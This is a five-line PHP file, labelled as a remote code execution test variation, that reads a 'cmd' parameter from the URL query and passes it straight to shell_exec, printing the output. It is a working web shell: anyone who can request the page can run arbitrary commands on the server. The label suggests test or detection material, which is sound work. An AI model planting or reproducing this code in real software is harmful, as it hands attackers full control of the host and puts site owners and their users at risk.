<?php
// RCE test variation #877
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>